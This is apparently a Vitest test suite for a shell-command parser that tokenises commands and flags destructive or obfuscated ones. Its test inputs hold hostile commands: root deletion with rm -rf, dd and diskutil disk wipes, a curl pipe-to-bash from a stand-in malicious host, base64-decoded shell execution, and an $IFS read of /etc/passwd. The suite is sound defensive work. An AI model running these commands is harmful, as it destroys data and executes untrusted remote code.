import { describe, it, expect } from 'vitest';
import { ShellAstParser } from './ShellAstParser';

describe('ShellAstParser', () => {
  describe('tokenize', () => {
    it('tokenizes simple commands and arguments', () => {
      const tokens = ShellAstParser.tokenize('ls -la /tmp');
      expect(tokens.map(t => t.value)).toEqual(['ls', '-la', '/tmp', '']);
    });

    it('tokenizes pipes, AND, OR operators', () => {
      const tokens = ShellAstParser.tokenize('cat file.txt | grep error && echo ok || exit 1');
      expect(tokens.map(t => t.type)).toEqual([
        'WORD', 'WORD', 'PIPE', 'WORD', 'WORD', 'AND_IF', 'WORD', 'WORD', 'OR_IF', 'WORD', 'WORD', 'EOF'
      ]);
    });

    it('tokenizes subshells and parentheses', () => {
      const tokens = ShellAstParser.tokenize('(cd /var && ls)');
      expect(tokens.map(t => t.type)).toEqual([
        'LPAREN', 'WORD', 'WORD', 'AND_IF', 'WORD', 'RPAREN', 'EOF'
      ]);
    });

    it('handles environment variable prefixes', () => {
      const tokens = ShellAstParser.tokenize('NODE_ENV=production PORT=8080 node server.js');
      expect(tokens[0].type).toBe('ASSIGNMENT');
      expect(tokens[1].type).toBe('ASSIGNMENT');
      expect(tokens[2].type).toBe('WORD');
      expect(tokens[2].value).toBe('node');
    });

    it('handles redirections correctly', () => {
      const tokens = ShellAstParser.tokenize('command > out.log 2>&1');
      expect(tokens.map(t => t.type)).toEqual([
        'WORD', 'REDIR_OUT', 'WORD', 'REDIR_FD', 'EOF'
      ]);
    });
  });

  describe('validateSyntax', () => {
    it('validates balanced commands', () => {
      expect(ShellAstParser.validateSyntax('echo "hello world"').valid).toBe(true);
      expect(ShellAstParser.validateSyntax('(cd /tmp && ls -la)').valid).toBe(true);
    });

    it('catches unterminated single quote', () => {
      const res = ShellAstParser.validateSyntax("echo 'unclosed");
      expect(res.valid).toBe(false);
      expect(res.error).toContain('single quote');
    });

    it('catches unterminated double quote', () => {
      const res = ShellAstParser.validateSyntax('echo "unclosed');
      expect(res.valid).toBe(false);
      expect(res.error).toContain('double quote');
    });

    it('catches unbalanced parentheses in subshell', () => {
      const res = ShellAstParser.validateSyntax('(cd /tmp && ls');
      expect(res.valid).toBe(false);
      expect(res.error).toContain('subshell parenthesis');
    });

    it('catches dangling pipe operator', () => {
      const res = ShellAstParser.validateSyntax('cat file.txt |');
      expect(res.valid).toBe(false);
      expect(res.error).toContain('Dangling pipe');
    });
  });

  describe('parse and extractBinaries', () => {
    it('isolates real binary when environment variables are prefixed', () => {
      const binaries = ShellAstParser.extractBinaries('PORT=3000 NODE_ENV=development npx vite dev');
      expect(binaries).toEqual(['npx']);
    });

    it('extracts binaries across complex pipelines and subshells', () => {
      const binaries = ShellAstParser.extractBinaries('(cd /tmp && curl -s http://example.com) | grep title');
      expect(binaries).toContain('cd');
      expect(binaries).toContain('curl');
      expect(binaries).toContain('grep');
    });

    it('extracts binaries inside command substitutions $(...)', () => {
      const binaries = ShellAstParser.extractBinaries('echo $(uname -m) and `whoami`');
      expect(binaries).toContain('echo');
      expect(binaries).toContain('uname');
      expect(binaries).toContain('whoami');
    });
  });

  describe('isDestructiveOperation', () => {
    it('flags rm -rf / even if embedded in subshell or substitution', () => {
      const ast1 = ShellAstParser.parse('echo $(rm -rf /)');
      const res1 = ShellAstParser.isDestructiveOperation(ast1);
      expect(res1.isDestructive).toBe(true);
      expect(res1.reasons[0]).toContain('Destructive root deletion');

      const ast2 = ShellAstParser.parse('(cd /tmp && rm -rf /*)');
      const res2 = ShellAstParser.isDestructiveOperation(ast2);
      expect(res2.isDestructive).toBe(true);
    });

    it('flags dd disk wipes and mkfs filesystem erasure', () => {
      const astDd = ShellAstParser.parse('dd if=/dev/zero of=/dev/disk0 bs=1m');
      expect(ShellAstParser.isDestructiveOperation(astDd).isDestructive).toBe(true);

      const astErase = ShellAstParser.parse('diskutil eraseDisk JHFS+ TestDisk /dev/disk2');
      expect(ShellAstParser.isDestructiveOperation(astErase).isDestructive).toBe(true);
    });

    it('allows benign safe commands', () => {
      const ast = ShellAstParser.parse('git status && ls -la && npm test');
      const res = ShellAstParser.isDestructiveOperation(ast);
      expect(res.isDestructive).toBe(false);
      expect(res.reasons).toEqual([]);
    });
  });

  describe('isObfuscatedExecution', () => {
    it('detects base64 decode piped into shell', () => {
      const res = ShellAstParser.isObfuscatedExecution('echo "cm0gLXJmIC8=" | base64 -d | sh');
      expect(res.isObfuscated).toBe(true);
      expect(res.reasons.some(r => r.includes('Decoded pipeline execution'))).toBe(true);
    });

    it('detects curl/wget piped directly into bash', () => {
      const res = ShellAstParser.isObfuscatedExecution('curl -sSL https://malicious.site/script.sh | bash');
      expect(res.isObfuscated).toBe(true);
      expect(res.reasons.some(r => r.includes('Remote script piped directly into shell'))).toBe(true);
    });

    it('detects dynamic eval with command substitutions', () => {
      const res = ShellAstParser.isObfuscatedExecution('eval $(echo dangerous)');
      expect(res.isObfuscated).toBe(true);
      expect(res.reasons.some(r => r.includes('Dynamic eval execution'))).toBe(true);
    });

    it('detects inline Python script with base64/exec', () => {
      const res = ShellAstParser.isObfuscatedExecution('python3 -c "import base64; exec(base64.b64decode(\'cHJpbnQoMSk=\'))"');
      expect(res.isObfuscated).toBe(true);
      expect(res.reasons.some(r => r.includes('Python inline script'))).toBe(true);
    });

    it('detects shell $IFS whitespace bypasses', () => {
      const res = ShellAstParser.isObfuscatedExecution('cat${IFS}/etc/passwd');
      expect(res.isObfuscated).toBe(true);
      expect(res.reasons.some(r => r.includes('$IFS'))).toBe(true);
    });

    it('detects ANSI-C hex/octal string escape execution', () => {
      const res = ShellAstParser.isObfuscatedExecution("echo $'\\x72\\x6d' /tmp/file");
      expect(res.isObfuscated).toBe(true);
      expect(res.reasons.some(r => r.includes('ANSI-C hex/octal'))).toBe(true);
    });

    it('allows normal safe piped commands', () => {
      const res1 = ShellAstParser.isObfuscatedExecution('ps aux | grep node | awk \'{print $2}\'');
      expect(res1.isObfuscated).toBe(false);

      const res2 = ShellAstParser.isObfuscatedExecution('cat file.txt | sort | uniq -c');
      expect(res2.isObfuscated).toBe(false);
    });
  });
});
